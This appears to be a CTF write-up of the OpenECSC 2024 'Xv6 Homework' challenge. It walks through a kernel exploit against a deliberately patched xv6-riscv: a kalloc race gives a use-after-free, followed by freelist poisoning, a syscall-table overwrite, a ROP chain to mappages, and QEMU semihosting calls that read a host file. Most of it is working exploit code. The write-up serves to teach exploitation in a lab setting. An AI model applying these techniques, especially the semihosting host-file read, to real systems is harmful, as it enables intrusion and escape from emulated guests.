---
title: 'OpenECSC 2024 - Round 3'
challenge: 'Xv6 Homework'
date: 2024-05-23T00:00:00+01:00
author: 'v0lp3'
description: 'Writeup for the OpenECSC 2024 - Round 3 CTF challenge "Xv6 Homework"' 
cover: '/img/openECSC/logo.png'
tags: ['pwn', 'shellcode', 'kernel', 'rop', 'xv6']
draft: false
---

## Challenge description

> My operating systems professor is teaching us using xv6. At the end of the lecture, he pointed us to section 6.10 exercise 1 of the book, which states:
>
> Comment out the calls to `acquire` and `release` in `kalloc` (`kernel/kalloc.c:69`). This seems like it should cause problems for kernel code that calls `kalloc`; what symptoms do you expect to see? When you run xv6, do you see these symptoms? How about when running `usertests`? If you don’t see a problem, why not? See if you can provoke a problem by inserting dummy loops into the critical section of `kalloc`.
>
> Can you help me write a decent answer before the next lecture?

## Overview

This is a write-up for the "Xv6 Homework" challenge from round 3 of openECSC 2024. This challenge introduces kernel exploitation by introducing a vulnerability in the [xv6-riscv](https://github.com/mit-pdos/xv6-riscv) operating system and provides insight into the semihosting feature in QEMU.

The challenge includes a patch that introduces a race condition in the `kalloc` function that can lead to a use-after-free vulnerability in a physical page. This use-after-free can then be exploited to perform an arbitrary write to the kernel's virtual memory, allowing us to hijack the program counter in kernel mode. Consequently, this leads to the execution of arbitrary code on the host system via the semihosting feature.

## The patch

The files provided by the challenge includes a file called *chall.patch*, which introduces a vulnerability into the codebase. The first significant part of the patch affects the `kalloc` function:

{{< code language="diff" title="chall.patch" id="1" expand="Show" collapse="Hide" isCollapsed="false" >}}
diff --git a/kernel/kalloc.c b/kernel/kalloc.c
index 0699e7e..4fd9012 100644
--- a/kernel/kalloc.c
+++ b/kernel/kalloc.c
@@ -70,11 +70,9 @@ kalloc(void)
 {
   struct run *r;
 
-  acquire(&kmem.lock);
   r = kmem.freelist;
   if(r)
     kmem.freelist = r->next;
-  release(&kmem.lock);
 
   if(r)
     memset((char*)r, 5, PGSIZE); // fill with junk
{{< /code >}}

The `kalloc` function is responsible for returning the address of an unused page in the physical address space. The patch shown above simplifies the process by removing the steps for acquiring and releasing the lock on the `kmem` memory. This lock is essential to prevent shared memory problems. For reference, the definitions of the types and symbols mentioned in the patch are given below:

{{< code language="c" title="Freelist structures" id="2" expand="Show" collapse="Hide" isCollapsed="false" >}}
struct spinlock {
  uint locked; 
  char *name;        
  struct cpu *cpu;
};

struct run {
  struct run *next;
};

struct {
  struct spinlock lock;
  struct run *freelist;
} kmem;
{{< /code >}}

In addition, as confirmed by the `kfree` function shown below, usually the memory management of the physical pages is handled by a simple linked list and a lock, which prevents concurrency problems:

{{< code language="c" title="kfree function" id="3" expand="Show" collapse="Hide" isCollapsed="false" >}}
void kfree(void *pa)
{
  struct run *r;  

  if(((uint64)pa % PGSIZE) != 0 || (char*)pa < end || (uint64)pa >= PHYSTOP)
    panic("kfree");

  // Fill with junk to catch dangling refs.
  memset(pa, 1, PGSIZE);
  r = (struct run*)pa;

  acquire(&kmem.lock);
  
  r->next = kmem.freelist;
  kmem.freelist = r;
  
  release(&kmem.lock);
}
{{< /code >}}

However, this isn't entirely unexpected. XV6 is a simple operating system primarily used for educational purposes, so it lacks many mitigation techniques. This can be seen in the memory allocator code. Even the PIE (Position Independent Executable) mitigation is practically absent.

Returning to the patch file, the second significant change introduced by the patch is the enabling of the semihosting feature in the QEMU emulation.

{{< code language="diff" title="chall.patch" id="4" expand="Show" collapse="Hide" isCollapsed="false" >}}
diff --git a/Makefile b/Makefile
index 39a99d7..59eca3b 100644
--- a/Makefile
+++ b/Makefile
@@ -160,6 +160,7 @@ QEMUOPTS = -machine virt -bios none -kernel $K/kernel -m 128M -smp $(CPUS) -nogr
 QEMUOPTS += -global virtio-mmio.force-legacy=false
 QEMUOPTS += -drive file=fs.img,if=none,format=raw,id=x0
 QEMUOPTS += -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0
+QEMUOPTS += -semihosting
{{< /code >}}

As noted in the `README.md` and in the [QEMU documentation](https://www.qemu.org/docs/master/about/emulation.html#:~:text=Warning), this may lead to an ACE (Arbitrary Code Execution) vulnerability on the host system running the QEMU software.

## Baby steps

In this challenge, the vulnerability is intentionally easy to spot and can be triggered by providing a userspace binary compiled as described in the README.md file. However, to escalate this to arbitrary code execution on the host machine, additional steps are necessary, which involve leveraging the semihosting feature. The required instructions for semihosting are privileged and can only be executed in kernel mode. The following sections provide a step-by-step description of the exploit.

### Trigger race condition and get UAF

As noted in the previous section, the patch removes the protection against race conditions. In brief, this means that if two processes run concurrently, they might allocate the same physical page. In other words, two processes can map the same physical address region to different virtual address regions in their respective virtual memory.

To trigger the race conditions, we need two specific capabilities in the userspace context:
1. The ability to allocate memory, which triggers `kalloc` in kernel space.
2. The ability to create a process that will run concurrently while memory is being allocated.

These conditions can be met using the following system calls, which are invoked by the userspace functions `sbrk` and `fork`:

{{< code language="c" title="Syscalls" id="5" expand="Show" collapse="Hide" isCollapsed="false" >}}
#define SYS_fork    1
[..]
#define SYS_sbrk   12
[...]
{{< /code >}}

The `sbrk` function takes as input the size of the requested increment in the virtual memory space of the process.This call traps into kernel mode and calls the corresponding `sys_sbrk`, which in turn calls `growproc`, which in turn calls `uvmalloc`. Finally, this function calls `kalloc` and `mappages`. The latter function maps the address returned by `kalloc` (physical address) with the old size of the process as the start address of the new memory area.

The following code triggers the race condition and results in a use-after-free in one physical page:

{{< code language="c" title="Stage 1" id="6" expand="Show" collapse="Hide" isCollapsed="false" >}}
#define PAGE_SIZE 4096
#define PAGES 100

void process1()
{
    for (int i = 0; i < PAGES; i++)
        sbrk(-PAGE_SIZE);

    sleep(50);
    
    [...]
}

void process2(uint64 *t[PAGES])
{
    sleep(30);

    int page = -1;

    for (int i = 0; i < PAGES; i++)
    {
        for (int j = 0; j < PAGE_SIZE; j++)
        {
            if (((char *)t[i])[j] != 0)
            {
                page = i;
                break;
            }
        }

        if (page != -1)
            break;
    }

    if (page == -1)
    {
        printf("[-] Exploit fails.");
        exit(-1);
    }

    printf("[+] Got UAF on page %d\n", page);
	
	[...]
}

int main()
{
    printf("[*] Stage 1: Trigger race condition and get UAF\n");

    int child = fork();

    uint64 *t[PAGES] = {0};

    for (int i = 0; i < PAGES; i++)
        t[i] = (uint64 *)sbrk(PAGE_SIZE);

    if (child != 0)
        process1();
    else
        process2(t);

    for (;;){}
    
    return 0;
}
{{< /code >}}

In the code provided, two processes are allocating memory at the same time. We can find the double-allocated page by checking contents the page. When a page is allocated, it's filled with null bytes. According to the `kfree` function, when a page is freed, it's filled with `\x01` bytes, except for the first 8 bytes, which will contain the pointer to the next free page.
### Poison the next pointer in kmem.freelist

The use-after-free issue on the physical page provides us with a significant capability. By manipulating the next pointer, we can corrupt the `kmem.freelist`, allowing a one-shot arbitrary write operation. However, the drawback is that the requested memory is wiped during allocation, meaning that certain memory areas can't be allocated, such as the kernel stack (kstack), because this would cause the kernel to panic upon returning to userspace.

{{< code language="c" title="Stage 2" id="7" expand="Show" collapse="Hide" isCollapsed="false" >}}
void process1()
{
	[...]
	
    uint64 *t2[PAGES] = {0};
    int aw_page = -1;

    for (int j = 0; j < PAGES; j++)
    {

        t2[j] = (uint64 *)sbrk(PAGE_SIZE);

        if (t2[j] == (uint64 *)-1)
        {
            aw_page = j - 1;
            break;
        }
    }

    uint64 *original_syscall_table[] = {(uint64 *)0x0, (uint64 *)0x0000000080002be4, (uint64 *)0x0000000080002b9e, (uint64 *)0x0000000080002bfc, (uint64 *)0x00000000800059f4, (uint64 *)0x0000000080005168, (uint64 *)0x0000000080002d12, (uint64 *)0x00000000800058e8, (uint64 *)0x0000000080005266, (uint64 *)0x0000000080005840, (uint64 *)0x000000008000511a, (uint64 *)0x0000000080002bca, (uint64 *)0x0000000080002c26, (uint64 *)0x0000000080002c68, (uint64 *)0x0000000080002d3c, (uint64 *)0x00000000800055c8, (uint64 *)0x00000000800051c0, (uint64 *)0x00000000800057c0, (uint64 *)0x00000000800053f6, (uint64 *)0x00000000800052ac, (uint64 *)0x0000000080005760, (uint64 *)0x0000000080005218};
    uint64 *syscall_table = (void *)t2[aw_page] + 0x450;

    for (int i = 0; i < sizeof(original_syscall_table) / sizeof(uint64 *); i++)
    {
        uint64 *syscall = (uint64 *)syscall_table + i;
        *syscall = (uint64)original_syscall_table[i];
    }

    printf("[+] Got AW. (%p -> 0x80008000)\n", t2[aw_page]);

    uint64 *kernel_pagetable = (void *)t2[aw_page] + 0x8b0;
    *kernel_pagetable = (uint64)0x87fff000;
	[...]
}

void process2(uint64 *t[PAGES])
{
	[...]
	
    printf("[*] Stage 2: Poison the next pointer in kmem.freelist\n");

    uint64 *next_pointer = (uint64 *)0x80008450;
    *t[page] = (uint64)next_pointer;
}
{{< /code >}}

In the code shown above, `process2` overwrites the next pointer of the freed page with the address _0x80008450_. This address was chosen because the page _0x80008000_ contains the vector of function pointers of the syscalls. After that, `process1` allocates new memory until it corrupts the syscall table. This issue is caused by the allocator zeroing the requested page, and this observation allows us to identify the page mapped to _0x80008000_. As a result, the following string is printed to stdout:

```
3 exe: unknown sys call 12
```

Indeed, the number of the `SYS_SBRK` syscall is 12.

Note two important things here:

- Although the address is _0x80008450_, the mapped physical address will be *0x80008000*.
- The address _0x80008000_ cannot be remapped, as this will cause a kernel panic in the `mappages` function.

However, the syscall table can be easily restored. In addition, we can now overwrite any pointer in this table, making it possible to call an arbitrary address. Ideally, we would like to call the `mappages` function to get an executable page in the kernel page table, but we don't have full control over the argument passed when calling this function.
### Getting control of the kstack

In the RISC-V architecture the first eight arguments are passed in registers *a0* to *a7*, the signature of the `mappages` function is:

```c
int mappages(pagetable_t pagetable, uint64 va, uint64 size, uint64 pa, int perm);
```

While playing around with GDB, I discovered that some registers retain their value after the context switch (from user mode to kernel mode), such as registers _a1_, _a2_, and _a3_, but not _a0_. However, there is an important detail here: the register _a0_ always contains the value `proc+720`, which corresponds to the process that requested the syscall. This refers to the following data structure:

{{< code language="c" title="proc structure" id="8" expand="Show" collapse="Hide" isCollapsed="false" >}}
// Per-process state
struct proc {
  struct spinlock lock;
  
  // p->lock must be held when using these:
  enum procstate state;        // Process state
  void *chan;                  // If non-zero, sleeping on chan
  int killed;                  // If non-zero, have been killed
  int xstate;                  // Exit status to be returned to parent's wait
  int pid;                     // Process ID

  // wait_lock must be held when using this:
  struct proc *parent;         // Parent process

  // these are private to the process, so p->lock need not be held.
  uint64 kstack;               // Virtual address of kernel stack
  uint64 sz;                   // Size of process memory (bytes)
  pagetable_t pagetable;       // User page table
  struct trapframe *trapframe; // data page for trampoline.S
  struct context context;      // swtch() here to run process
  struct file *ofile[NOFILE];  // Open files
  struct inode *cwd;           // Current directory
  char name[16];               // Process name (debugging)
};

[...]

struct proc proc[NPROC];

[...]
{{< /code >}}

This structure is used to store and restore the state of the registers before and after the context switch from user mode to kernel mode and vice versa. A good target to overwrite is the `kstack` pointer, as it will be loaded as the stack base on the next context switch to the kernel mode. This means that with the right gadgets, the execution can be controlled. Taking advantage of the fact that `a0` was already set, I used the following code to overwrite its pointed memory:

{{< code language="c" title="Stage 3" id="9" expand="Show" collapse="Hide" isCollapsed="false" >}}
void process1()
{
	[...]
	printf("[*] Stage 3: Getting control of the kstack\n");

    uint64 *victim_syscall = (uint64 *)syscall_table + 1;
    *victim_syscall = 0x0000000080000d6e; // memcpy (memmove+90)

    uint64 *proc = (void *)t2[aw_page] + 0xa00;
    *(proc + 8) = 0x80007350; // new value for kstack of proc

    printf("[+] kstack pointer of proc %d overwrote with %p\n", getpid(), *(proc + 8));

    asm volatile("          \
        li a1, 0x80008a00;  \
        li a2, 72;          \
        li a7, 1;           \
        ecall;              \
    ");
    
    [...]
{{< /code >}}

This will result in a call to `memcpy(dst=proc+720, src=controlled address, size=controlled size)`, and then return to userland.

### ~~Road~~ Rop to mappages

It's worth noting is that in RISC-V, the return address isn't popped from the stack by the `ret` instruction; instead, it simply jumps to the address contained in the register _ra_. Also, there are no gadgets that will directly pop into _a0_ and company. Instead, the arguments of a function are usually loaded from the stack into registers _s0_ to _s11_, and their values are then moved into the function argument registers *a0*-*a7*. Using the address _0x0000000080001454_ as an example, the usual call pattern is as follows:

{{< code language="assembly" title="Function call pattern" id="10" expand="Show" collapse="Hide" isCollapsed="false" >}}
0x0000000080001454 <+72>:    mv      a4,s6
0x0000000080001456 <+74>:    mv      a3,s1
0x0000000080001458 <+76>:    lui     a2,0x1
0x000000008000145a <+78>:    mv      a1,s2
0x000000008000145c <+80>:    mv      a0,s5
0x000000008000145e <+82>:    auipc   ra,0x0
0x0000000080001462 <+86>:    jalr    -988(ra) # 0x80001082 <walkaddr+64>
{{< /code >}}

In this case, the last two instructions make relative jumps to the `mappages` function.

The two goals of my ROP chain are:
1. Restore the `kmem.freelist` pointer to a valid value (In hindsight, it seems unnecessary).
2. Map the physical page containing the `pwn` function of the exploit to an unmapped space in the kernel page table to obtain a virtual executable page containing its code.
3. Jump into the `pwn` function from kernel context.

I found out the address where the binary was loaded by breaking on the `loadseg` symbol before executing the `exe` file.

Here is the relevant part of the exploit:

{{< code language="c" title="Stage 4" id="11" expand="Show" collapse="Hide" isCollapsed="false" >}}
#define PTE_R (1L << 1)
#define PTE_X (1L << 3)

void process1()
{
	[...]
    
    printf("%s", "[*] Stage 4: Ropping to mappages\n");

    *victim_syscall = 0x0000000080003ac2; // (writei+238) ld ra, 104(sp), ld s0, 96(sp) ... addi sp, sp, 112, ret

    uint64 *stack1 = (uint64 *)((void *)t2[aw_page] + 0x310 + 104);
    *stack1 = (uint64)0x000000008000150c; // call to kfree
    *(stack1 - 5) = 0x0000000087F03000;   // random page to free

    uint64 *stack2 = (uint64 *)((void *)t2[aw_page] + 0x380 + 40);
    *stack2 = (uint64)0x000000008000150c; // call to kfree
    *(stack2 - 5) = 0x0000000087F02000;   // random page to free

    uint64 *stack3 = (uint64 *)((void *)t2[aw_page] + 0x3b0 + 40);
    *stack3 = (uint64)0x0000000080003ac2; // (writei+238) ld ra, 104(sp), ld s0, 96(sp) ... addi sp, sp, 112, ret

    uint64 *stack4 = (uint64 *)((void *)t2[aw_page] + 0x3e0 + 104);
    *stack4 = (uint64)0x0000000080001454;   // call to mappages
    *(stack4 - 2) = (uint64)0x87f3f000;     // (pa) page containing the pwn function
    *(stack4 - 3) = (uint64)0x3fffffe000;   // (va) actually unmapped address in kernel pagetable 
    *(stack4 - 5) = (uint64)0x0;
    *(stack4 - 6) = (uint64)0x87fff000;     // (pagetable) kernel pagetable
    *(stack4 - 7) = (uint64)PTE_R | PTE_X;         

    uint64 *stack5 = (uint64 *)((void *)t2[aw_page] + 0x450 + 56);
    *stack5 = 0x3fffffe000;

    asm volatile("li a7, 1;      \
        ecall;          \
    ");
}

[...]
{{< /code >}}

As showed in the code, the controlled stack was forged to make the executions of the following pseudo-code:

```c
kfree(0x0000000087F03000);
kfree(0x0000000087F02000);
mappages(pagetable=0x87fff000, va=0x3fffffe000, size=0x1000, pa=0x87f3f000, flags=PTE_R | PTE_X);
(*0x3fffffe000)();
```
### Arbitrary code execution

At the end of the ROP chain, we will jump to the address 0x3fffffe000, where the `pwn` function is located, gaining arbitrary code execution in kernel mode. This privileged context allows the execution of any instruction in the ISA, so the semihosting feature can be used to retrieve the flag.

Semihosting mode allows the hosted system to interact with the host system for debugging purposes. This feature can be used through a specific sequence of instructions:

```
slli x0, x0, 0x1f
ebreak
srai x0, x0,  0x7
```

This sequence expects to receive the syscall number in the register a0 and the argument pointer array in the register a1. The idea is to use the semihosting syscalls `open` and `read` to open the file _flag.txt_ and write its content to a known location. Then, the `printf` function can be used to print the buffer to stdout and retrieve the flag!

Note that although semihosting allows the use of the `write` syscall, executing it will print the content of the buffer to the GDB console. Since we can't attach GDB to the remote instance of the challenge, this method will not work for retrieving the flag.

The relevant code is as follows:

{{< code language="c" title="Stage 5" id="12" expand="Show" collapse="Hide" isCollapsed="false" >}}
#define SH_SYS_OPEN 0x01
#define SH_SYS_READ 0x06

static inline int __attribute__((always_inline)) sys_sh(int reason, void *argPack)
{
    register int value asm("a0") = reason;
    register void *ptr asm("a1") = argPack;
    asm volatile(
        " .balign 16    \n"
        " .option push \n"
        " .option norvc \n"
        " slli x0, x0, 0x1f \n"
        " ebreak \n"
        " srai x0, x0,  0x7 \n"
        " .option pop \n"
        : "=r"(value)
        : "0"(value), "r"(ptr)
        : "memory");
    return value;
}

void pwn()
{
    void (*printf)(const char *, ...) = (void *)0x0000000080000596;

    printf("[*] Stage 5: Arbitrary code execution\n");

    char *flag_path = "/home/user/flag\x00";
    char *flag_buffer = (char *)0x80008d00;

    void *args[] = {(uint64 *)flag_path, (uint64 *)0x0, (uint64 *)15};

    int fd = sys_sh(SH_SYS_OPEN, args);

    void *args1[] = {(uint64 *)(uint64)fd, (uint64 *)flag_buffer, (uint64 *)0x20};

    sys_sh(SH_SYS_READ, args1);

    printf("Got flag?! %s\n", (char *)flag_buffer);

    for (;;) {}
}
{{< /code >}}

## Conclusion

This challenge was very enjoyable because, despite the abundance of material on the Xv6 operating system, I found almost no documented strategies for exploiting its possible kernel bugs. However, this is cool because it means the challenge is unique and original.

To conclude this writeup, let me answer to the questions in the challenge description 🥸:

1. What symptoms do you expect to see?
    - The symptoms we expect to see include potential race conditions leading to memory corruption or unexpected behavior due to concurrent memory allocation and process creation.
2. When you run xv6, do you see these symptoms?
    - Yes, we've observed symptoms that indicate that if two processes running concurrently may improperly allocate the same physical page of memory. This issue arises due to the lack of locking mechanisms to ensure mutual exclusion when allocating memory. Reintegrating the lock into `kalloc` would prevent this scenario from occurring.
3. How about when running `usertests`?
    - When running `usertests`, we encounter a kernel panic specifically in the `reparent2` test. This test makes heavy use of the `fork` function to create multiple concurrent processes. Consequently, it's plausible that during the process allocation phase, some processes end up sharing the same physical page of memory. This sharing is likely to cause the observed kernel panic.

> openECSC{gg_wp_0adb3e38}
